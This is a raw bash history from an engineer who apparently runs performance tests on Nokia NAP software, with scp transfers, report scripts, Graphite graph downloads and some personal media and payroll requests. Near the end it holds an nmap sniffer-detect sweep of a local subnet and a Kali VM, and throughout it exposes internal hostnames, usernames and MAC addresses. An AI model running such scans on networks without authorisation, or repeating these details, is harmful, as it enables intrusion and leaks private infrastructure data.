ll
vi checkPerfIsCompleted.sh
echo $EDITOR
sudo apt install vim
cd /usr/share/vim/vim74/colors/
ll
cd
ll
vi .vimrc
cd /usr/share/vim/vim74/colors/
cd /c/nokia_git/napPerformanceTestSuite/
vi checkPerfIsCompleted.sh
which env
echo "#\!/usr/bin/env bash" > checkPerfIsCompleted.sh
vi checkPerfIsCompleted.sh
ll
./checkPerfIsCompleted.sh 
basename /home/nap/perf/traffic_generator/log/napPerformanceRun-20181114T010028-0.5h.log
./checkPerfIsCompleted.sh 
[[ -f checkPerfIsCompleted.sh-status ]] && echo "OK || echo "NOK"
[[ -f checkPerfIsCompleted.sh-status ]] && echo "OK" || echo "NOK"
touch checkPerfIsCompleted.sh-status
[[ -f checkPerfIsCompleted.sh-status ]] && echo "OK" || echo "NOK"
rm checkPerfIsCompleted.sh-status 
./checkPerfIsCompleted.sh 
less checkPerfIsCompleted.sh-status\
./checkPerfIsCompleted.sh 
echo napPerformanceRun-20181114T010028-0.5h.log >> checkPerfIsCompleted.sh-status 
./checkPerfIsCompleted.sh 
./checkPerfIsCompleted.sh start
history | less
git log
./checkPerfIsCompleted.sh start
scp /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.3/Packages/nsnnapfour-176.ldif nap@naqda01:/home/nap/
cd /c/miscprojects/cooltest
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Generic_03b
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Generic_04b
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Generic_05
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_PUBL_DSPA_04bde
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbb
ulimit -n
ulimit -n 1000000
ulimit -n
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbb
sudo ./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbb
ulimit -n
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbb
ll
bundler install
bundler update
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbb
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbbc
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbb
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbbc
cd /c/miscprojects/cooltest
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_QueueR_01bbbc
exit
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.4/Packages/
scp *.rpm nap@ncsda01:/var/opt/nap/packages/
ll
scp NSNNAPcookbooks-2.0.4-1.x86_64.rpm NSNNAPppc-2.0.4-1.x86_64.rpm nap@ncsda01:/var/opt/nap/packages/
scp nap@ncsda01:/var/opt/tmp/rel-4.1.4-pre/* /c/NAP/NAP4/rel-4.1.0-Drop2/tmolab/updateWith4.1.4-pre/logs/
cd ../
ll
cd ..
ll
cd installs/
ll
cd tmolab/
ll
cd updateCHI/
ll
less ncsda01-main-1.log 
scp nap@ncsda01:/var/opt/tmp/rel-4.1.x-updateCHI/* logs/
cd ../../..
cd
ll
echo -e "itemA1\nitemA2\nitemA3\n" > a.txt
echo -e "itemB1\nitemB2\nitemB3\n" > b.txt
paste
man paste
paste -d " " a.txt b.txt 
exit
cd /c/nokia_git/napPerformanceTestSuite/
ll
./checkPerfIsCompleted.sh
./checkPerfIsCompleted.sh start
bash -x ./checkPerfIsCompleted.sh start
./checkPerfIsCompleted.sh start
bash -x ./checkPerfIsCompleted.sh start
ll
grep render monitor/pnwlab-performance_watch-redesigned.html | grep ".png" | awk '{split($0,a,"src="); print a[2];}'| awk '{split($0,a,"'\''"); print a[2];}'
egrep "render|h1|h2|h3|h4" monitor/pnwlab-performance_watch-redesigned.html | grep ".png" | awk '{split($0,a,"src="); print a[2];}'| awk '{split($0,a,"'\''"); print a[2];}'
egrep "render|h1|h2|h3|h4" monitor/pnwlab-performance_watch-redesigned.html
egrep "render|h1|h2|h3|h4" monitor/pnwlab-performance_watch-redesigned.html > tmp.html
ll
cd monitor/
ll
mv ../perf_structure.json .
ll
ruby ./generate_html.rb 
which ruby
ruby -v
ruby ./generate_html.rb 
ruby ./generate_html.rb |less
ruby ./generate_html.rb 2>& |less
ruby ./generate_html.rb |less 2>&
ruby ./generate_html.rb |less 2>&1
ruby ./generate_html.rb |less 2>1
ruby ./generate_html.rb 
ruby ./generate_html.rb |less
ruby ./generate_html.rb > generated_graph_test.html
pandoc
man pandoc
pandoc -f makrdown -t html generated_graph_test.html -o t.html
pandoc -f markdown -t html generated_graph_test.html -o t.html
ruby ./generate_html.rb > generated_graph_test.html
pandoc -f markdown -t html generated_graph_test.html -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
pandoc -f markdown -t html generated_graph_test.md -o t.html
ruby ./generate_html.rb > generated_graph_test.md
ruby ./generate_html.rb > generated_graph_test.html
ruby ./generate_final_report.rb > generated_graph_test.html
ruby ./generate_final_report.rb html > generated_graph_test.html
ruby ./generate_final_report.rb > generated_graph_test.html
ruby ./generate_final_report.rb htm
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned'
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' > generated_graph_test.html 
scp -p 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
ruby ./generate_final_report.rb 
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
ruby ./generate_final_report.rb 
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test.html 
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true|less
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test.html 
curl -o "Archive/report_20181204T004302/0/tps_stats_RED.png" "http://127.0.0.1:3313/render/tps_stats_RED.png?target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.dspa.*.*.TOTAL.count,'1min')),0.0166666666666667),'DSPA total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.pps.*.query.TOTAL.count,'1min')),0.0166666666666667),'PPS total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.upsell.*.*.TOTAL.count,'1min')),0.0166666666666667),'UPSELL total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.ui.*.*.TOTAL.count,'1min')),0.0166666666666667),'UI total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.dspa.*.*.NOK.count,'1min')),0.0166666666666667),'DSPA error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.pps.*.query.NOK.count,'1min')),0.0166666666666667),'PPS error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.upsell.*.*.NOK.count,'1min')),0.0166666666666667),'UPSELL error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.ui.*.*.NOK.count,'1min')),0.0166666666666667),'UI error')&width=900&height=500&format=png&margin=10&lineWidth=2&yMax=640&yStep=120&lineMode=connected&title=FE TPS RED&vtitle=TPS&lineMode=connected&tz=US/Pacific&fontSize=14&from=07:00_20181128&until=12:10_20181128"
curl -v -o "Archive/report_20181204T004302/0/tps_stats_RED.png" "http://127.0.0.1:3313/render/tps_stats_RED.png?target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.dspa.*.*.TOTAL.count,'1min')),0.0166666666666667),'DSPA total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.pps.*.query.TOTAL.count,'1min')),0.0166666666666667),'PPS total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.upsell.*.*.TOTAL.count,'1min')),0.0166666666666667),'UPSELL total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.ui.*.*.TOTAL.count,'1min')),0.0166666666666667),'UI total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.dspa.*.*.NOK.count,'1min')),0.0166666666666667),'DSPA error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.pps.*.query.NOK.count,'1min')),0.0166666666666667),'PPS error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.upsell.*.*.NOK.count,'1min')),0.0166666666666667),'UPSELL error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.ui.*.*.NOK.count,'1min')),0.0166666666666667),'UI error')&width=900&height=500&format=png&margin=10&lineWidth=2&yMax=640&yStep=120&lineMode=connected&title=FE TPS RED&vtitle=TPS&lineMode=connected&tz=US/Pacific&fontSize=14&from=07:00_20181128&until=12:10_20181128"
wget -O "Archive/report_20181204T004302/0/tps_stats_RED.png" -nv "http://127.0.0.1:3313/render/tps_stats_RED.png?target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.dspa.*.*.TOTAL.count,'1min')),0.0166666666666667),'DSPA total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.pps.*.query.TOTAL.count,'1min')),0.0166666666666667),'PPS total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.upsell.*.*.TOTAL.count,'1min')),0.0166666666666667),'UPSELL total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.ui.*.*.TOTAL.count,'1min')),0.0166666666666667),'UI total')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.dspa.*.*.NOK.count,'1min')),0.0166666666666667),'DSPA error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.pps.*.query.NOK.count,'1min')),0.0166666666666667),'PPS error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.upsell.*.*.NOK.count,'1min')),0.0166666666666667),'UPSELL error')&target=alias(scale(sumSeries(summarize(nap.RE.napred01.*.ui.*.*.NOK.count,'1min')),0.0166666666666667),'UI error')&width=900&height=500&format=png&margin=10&lineWidth=2&yMax=640&yStep=120&lineMode=connected&title=FE TPS RED&vtitle=TPS&lineMode=connected&tz=US/Pacific&fontSize=14&from=07:00_20181128&until=12:10_20181128"
ruby ./generate_final_report.rb html '&from=07:00_20181128&until=12:10_20181128,&from=17:00_20181127&until=21:30_20181127,&from=07:00_20181129&until=12:10_20181129' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test.html 
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
ruby ./generate_final_report.rb
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
cd ..
ll
./checkPerfIsCompleted.sh
./checkPerfIsCompleted.sh start
nohup ./checkPerfIsCompleted.sh start &
less nohup.out 
ll
less nohup.out 
kill 20275
rm nohup.out 
nohup ./checkPerfIsCompleted.sh start &
less nohup.out 
ll
scp -P 3307 nap@127.0.0.1:/home/nap/perf/traffic_generator/runPerf.sh traffic_generator/runPerf.sh_5Dec2018
cd traffic_generator/
diff runPerf.sh runPerf.sh_5Dec2018 
scp -P 3307 runPerf.sh nap@127.0.0.1:/home/nap/perf/traffic_generator/
ll
cd ..
ll
less nohup.out 
ps -ef | grep check
kill 32320
nohup ./checkPerfIsCompleted.sh start &
ll
less nohup.out 
ll
scp -P 3307 nap@127.0.0.1:/home/nap/perf/resetNapQueues.sh resetNapQueues.sh_5Dec2018
diff resetNapQueues.sh resetNapQueues.sh_5Dec2018 
scp -P 3307 resetNapQueues.sh performanceExecutionWrapper.sh nap@127.0.0.1:/home/nap/perf/
scp -P 3307 traffic_generator/runPerf.sh nap@127.0.0.1:/home/nap/perf/traffic_generator/
ll
ps -ef|grep check
kill 4178
nohup ./checkPerfIsCompleted.sh start &
ll
less nohup.out 
ruby ./generate_final_report.rb html '&from=07:50_20181128&until=12:00_20181128,&from=17:15_20181127&until=21:25_20181127,&from=14:25_20181205&until=18:26_20181205' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test_5Dec2018.html 
ll
cd monitor/
ruby ./generate_final_report.rb html '&from=07:50_20181128&until=12:00_20181128,&from=17:15_20181127&until=21:25_20181127,&from=14:25_20181205&until=18:26_20181205' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test_5Dec2018.html 
ruby ./generate_final_report.rb html '&from=07:50_20181128&until=12:00_20181128,&from=17:15_20181127&until=21:25_20181127,&from=14:25_20181205&until=18:30_20181205' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test_5Dec2018.html 
cd Archive/base
ll
ls -1 *.png
for i in $(ls -1 *.png); do echo ${i//(*}; done
for i in $(ls -1 *.png); do echo ${i//(*.}; done
for i in $(ls -1 *.png); do echo ${i//(*)}; done
for i in $(ls -1 *.png); do mv $i ${i//(*)}; done
ll
cd ../..
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
ruby ./generate_final_report.rb html '&from=07:50_20181128&until=12:00_20181128,&from=17:15_20181127&until=21:25_20181127,&from=14:25_20181205&until=18:30_20181205' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test_5Dec2018.html 
cd Archive/base
for i in $(ls -1 *.png); do mv $i ${i//(*)}; done
ll
for i in $(ls -1 *.png); do mv $i ${i//(*)}; done
cp "C:\NAP\NAP4\rel-4.0.0-Drop1\release-4.0.2\Documents\redlab-perf-27Sep2018-4.0.2Drop1-full\redlab-perf-27Sep2018-4.0.2Drop1-full_files\*\(2\)*" .
cp "/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/Documents/redlab-perf-27Sep2018-4.0.2Drop1-full/redlab-perf-27Sep2018-4.0.2Drop1-full_files/*\(2\)*" .
cp /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/Documents/redlab-perf-27Sep2018-4.0.2Drop1-full/redlab-perf-27Sep2018-4.0.2Drop1-full_files/*\(2\)* .
ll
for i in $(ls -1 *.png); do mv $i ${i//(*)}; done
ll
rm *.png
cp /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/Documents/redlab-perf-27Sep2018-4.0.2Drop1-full/redlab-perf-27Sep2018-4.0.2Drop1-full_files/*\(2\)* .
for i in $(ls -1 *.png); do mv $i ${i//(*)}; done
cd ../..
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
ruby ./generate_final_report.rb html '&from=07:50_20181128&until=12:00_20181128,&from=17:15_20181127&until=21:25_20181127,&from=14:25_20181205&until=18:30_20181205' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test_5Dec2018.html 
histor|grep ruby | less
history|grep ruby | less
wich ruby
which ruby
ruby -v
apt-get list ruby
apt-get
apt-get update
rubygems -v
ruby gems -v
rubygems
ruby rubygems -v
ruby rubygems
ruby -v
rubygems
gem -v
rvm
rbenv
which ruby
wget http://127.0.0.1:3313/render/disk_usage_redfe.png?target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__,"/")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__opt,"/opt")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__var,"/var")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__tmp,"/tmp")&target=alias(constantLine(98302),"/ size")&target=alias(constantLine(19558),"/tmp size")&target=alias(constantLine(783777),"/var size")&target=alias(constantLine(98302),"/opt size")&width=900&height=500&format=png&margin=10&lineWidth=2&lineMode=connected&hideLegend=false&title=Disk Usage RED FE&vtitle=MB&tz=US/Pacific&fontSize=14&from=14:25_20181205&until=19:00_20181205
wget "http://127.0.0.1:3313/render/disk_usage_redfe.png?target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__,"/")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__opt,"/opt")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__var,"/var")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__tmp,"/tmp")&target=alias(constantLine(98302),"/ size")&target=alias(constantLine(19558),"/tmp size")&target=alias(constantLine(783777),"/var size")&target=alias(constantLine(98302),"/opt size")&width=900&height=500&format=png&margin=10&lineWidth=2&lineMode=connected&hideLegend=false&title=Disk Usage RED FE&vtitle=MB&tz=US/Pacific&fontSize=14&from=14:25_20181205&until=19:00_20181205"
ll
wget "http://127.0.0.1:3313/render/disk_usage_redfe.png?target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__,"/")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__opt,"/opt")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__var,"/var")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__tmp,"/tmp")&target=alias(constantLine(98302),"/ size")&target=alias(constantLine(19558),"/tmp size")&target=alias(constantLine(783777),"/var size")&target=alias(constantLine(98302),"/opt size")&width=900&height=500&format=png&margin=10&lineWidth=2&lineMode=connected&hideLegend=false&title=Disk Usage RED FE&vtitle=MB&tz=US/Pacific&fontSize=14&from=14:25_20181205&until=19:00_20181205"
wget -nv "http://127.0.0.1:3313/render/disk_usage_redfe.png?target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__,"/")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__opt,"/opt")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__var,"/var")&target=alias(nap.perf_tests.NAP3.REDLab1.diskUsage.REDFE.disk_usage_mb__tmp,"/tmp")&target=alias(constantLine(98302),"/ size")&target=alias(constantLine(19558),"/tmp size")&target=alias(constantLine(783777),"/var size")&target=alias(constantLine(98302),"/opt size")&width=900&height=500&format=png&margin=10&lineWidth=2&lineMode=connected&hideLegend=false&title=Disk Usage RED FE&vtitle=MB&tz=US/Pacific&fontSize=14&from=14:25_20181205&until=19:00_20181205"
wget -nv "http://127.0.0.1:3313/render/qload_total_REDQ2.png?target=sumSeries(nap.perf_tests.NAP3.REDLab1.queueMsgs.QREDLAB2.nap*Message*)&target=maximumAbove(nap.perf_tests.NAP3.REDLab1.queueMsgs.QREDLAB2.nap*Message*,1000)&width=900&height=800&format=png&margin=10&lineWidth=2&lineMode=connected&title=Qload total RED QS2 (pids over 1000)&vtitle=messages&yMax=750000&hideLegend=false&lineMode=connected&tz=US/Pacific&fontSize=14&from=14:25_20181205
&until=19:00_20181205"
wget -nv "http://127.0.0.1:3313/render/qload_total_REDQ2.png?target=sumSeries(nap.perf_tests.NAP3.REDLab1.queueMsgs.QREDLAB2.nap*Message*)&target=maximumAbove(nap.perf_tests.NAP3.REDLab1.queueMsgs.QREDLAB2.nap*Message*,1000)&width=900&height=800&format=png&margin=10&lineWidth=2&lineMode=connected&title=Qload total RED QS2 (pids over 1000)&vtitle=messages&yMax=750000&hideLegend=false&lineMode=connected&tz=US/Pacific&fontSize=14&from=14:25_20181205&until=19:00_20181205"
wget -nv "http://127.0.0.1:3313/render/qload_total_REDQ2.png?target=sumSeries(nap.perf_tests.NAP3.REDLab1.queueMsgs.QREDLAB2.nap*Message*)&target=maximumAbove(nap.perf_tests.NAP3.REDLab1.queueMsgs.QREDLAB2.nap*Message*,1000)&width=900&height=800&format=png&margin=10&lineWidth=2&lineMode=connected&title=Qload total RED QS2 (pids over 1000)&vtitle=messages&yMax=750000&hideLegend=false&lineMode=connected&tz=US/Pacific&fontSize=14&from=14:25_20181205&until=19:00_20181205" -O qload_total_REDQ2.png
ll
rm qload_total_REDQ2.png 
ruby ./generate_final_report.rb html '&from=07:50_20181128&until=12:00_20181128,&from=17:15_20181127&until=21:25_20181127,&from=14:25_20181205&until=18:30_20181205' 'Base (v4.0.1),Non Partitioned,Partial Partitioned,Full Partitioned' true > generated_graph_test_5Dec2018.html 
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
cd ..
ll
ps -ef|grep check
nohup ./checkPerfIsCompleted.sh start &
less nohup.out 
./performanceExecutionWrapper.sh 
./performanceExecutionWrapper.sh -e=REDLAB
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
cd monitor/
scp -P 3307 generate_final_report.rb perf_structure.json nap@127.0.0.1:/home/nap/perf/monitor/
scp -P 3307 resetNapQueues.sh performanceExecutionWrapper.sh nap@127.0.0.1:/home/nap/perf/
cd ./.
cd ..
scp -P 3307 resetNapQueues.sh performanceExecutionWrapper.sh nap@127.0.0.1:/home/nap/perf/
cd monitor/
ruby ./generate_final_report.rb html '&from=23:25_20181209&until=04:00_20181210' 'Base (v4.0.1),FullPartitioned' > generated_graph_test_10Dec2018.html 
cd ..
ll
git status -sb
cd monitor/
ruby ./generate_final_report.rb html '&from=14:15_20181212&until=19:00_20181212' 'Base (v4.0.1),PartialPartitioned' > generated_graph_test_12Dec2018.html 
ping 172.16.2.99
exit
cd /c/NAP/NAP4/rel-4.1.0-Drop2/
ll
cd tmolab/
ll
scp DTR/* nap@nisda01:/ISS/nap/ATPlogs/NAP4/release-4.1.0/
scp /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.4/Packages/nap-4.1.3-1.x86_64.rpm nap@ncsda01:/var/opt/nap/packages
cd /c/miscprojects/cooltest
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Custom_08
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Custom_08b
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Custom_09
aplay -l
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Custom_111
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_PUBL_DSPA_NP_04
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_PUBL_DSPA_NP_03
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_Generic_03
exit
mplayer
apt-get install mplayer
mplayer -nocache -afm ffmpeg http://wknc.sma.ncsu.edu:8000/wknchd1.mp3
exit
route -n
nmap
apt-get install nmap
nmap -sn --script-sniffer 192.168.0.1/24
nmap -sn --script=sniffer-detect 192.168.0.1/24
env
cd /c/VMs/kali/
ll
vi Vagrantfile 
ifconfig
route -n
less Vagrantfile 
exit
for in `cat latestNAP4-rpms.txt`; do echo $i; done;
exit
bash --version
echo $SHELL
for i in $(cat latestNAP4-rpms.txt); do echo $i; done;
exit
cd /c/nokia_git/napPerformanceTestSuite/
ll
scp -P 3307 traffic_generator/preprovision/conf/*  nap@127.0.0.1:/home/nap/perf/traffic_generator/preprovision/conf/
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.4/production-installs/
ll
cd wo3957057task4/
l
ll
scp -R nap@ncsda001:/var/opt/tmp/wo3957984task4/* DAL/logs/
scp -r nap@ncsda001:/var/opt/tmp/wo3957984task4/* DAL/logs/
scp -r nap@ncsel001:/var/opt/tmp/wo3957984task4/* ELG/logs/
scp -r nap@ncsnv001:/var/opt/tmp/wo3957984task4/* NVL/logs/
cd ..
ls
cd production-installs/
ll
mv wo3957057task4 wo3957984task4
sudo mv wo3957057task4 wo3957984task4
cd 
pwd
cd ..
ll
cd home/
ll
cd
ll
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=WujKJpxaUHk&list=PL47371EB3D2E74284"
apt get updated
apt-get updated
apt-get update
apt-get update youtube-dl
apt-get install youtube-dl
apt-get youtube-dl
apt-get
apt-get upgrade youtube-dl
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=WujKJpxaUHk&list=PL47371EB3D2E74284"
youtube-dl -U
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=WujKJpxaUHk&list=PL47371EB3D2E74284"
cd /c/NAP/\!NokiaCAPS/
ll
mkdir rpms
cd rpms/
cd ..
vi latestNAP4-rpms.txt
cat latestNAP4-rpms.txt 
for in $(cat latestNAP4-rpms.txt); do echo $i; done;
for in `cat latestNAP4-rpms.txt`; do echo $i; done;
bash
for in $(cat latestNAP4-rpms.txt); do echo $i; done;
cd ..
mv \!NokiaCAPS NokiaCAPS
cd NokiaCAPS/
for in $(cat latestNAP4-rpms.txt); do echo $i; done;
dos2unix
apt-get install dos2unix
dos2unix latestNAP4-rpms.txt 
for in $(cat latestNAP4-rpms.txt); do echo $i; done;
for in $(cat latestNAP4-rpms.txt);do echo $i; done;
for in $(cat latestNAP4-rpms.txt);do echo $i; done;
bash -v
for i in $(cat latestNAP4-rpms.txt); do echo $i; done;
ll
for i in $(cat latestNAP4-rpms.txt); do scp nap@ncsel001:${i} rpms/; done;
ls rpms/
ls -alh rpms/
ifconfig
cd /c/nokia_git/napPerformanceTestSuite/
ll
./syncRemoteFolders.sh 
cd
./getmp3fromyoutube.sh "https://www.facebook.com/100001121685624/videos/1917072285006809/?story_fbid=1917074478339923&id=100001121685624&comment_id=1918264658220905&reply_comment_id=1918293108218060&notif_id=1544804614777641&notif_t=feed_comment_reply"
./getmp3fromyoutube.sh "https://www.facebook.com/100001121685624/videos/1915810118466359/?id=100001121685624&__tn__=%2CdlC-R-R&eid=ARCICoOSZVXIPMizOZgaD5X6Kvi3yHIZGiMIRIp3AUI0VQk9OiI0PCWXbjloYIBO3QgJeQGnwc8c2God&hc_ref=ARTh1FibYI3dV2mUIto64k7JA2Z2wu46ZlDgMnrUj2oKeC3CXySURhOBU6B4cZ63310"
./getmp3fromyoutube.sh "https://www.facebook.com/100001121685624/videos/1916911961689508/?id=100001121685624&__tn__=%2CdlC-R-R&eid=ARCICoOSZVXIPMizOZgaD5X6Kvi3yHIZGiMIRIp3AUI0VQk9OiI0PCWXbjloYIBO3QgJeQGnwc8c2God&hc_ref=ARTh1FibYI3dV2mUIto64k7JA2Z2wu46ZlDgMnrUj2oKeC3CXySURhOBU6B4cZ63310"
exit
cd /c/nokia_git/napPerformanceTestSuite/
ll
./syncRemoteFolders.sh 
ifconfig
ifconfig | grep HWaddr
ifconfig -a | grep HWaddr
ifconfig -a | grep HWaddr | grep -i 00:90:47:30:0b:7b
ifconfig -a | grep HWaddr | grep -i 00:90:47:30:17:00
ifconfig -a | grep HWaddr
ifconfig -a
ifconfig -a | grep HWaddr
ifconfig -a
ifconfig -a|grep 192.168
curl -XPOST "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyCheck.aspx
curl -XPOST "__EVENTTARGET=-d ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyCheck.aspx
curl -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://w
curl -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyCheck.aspx
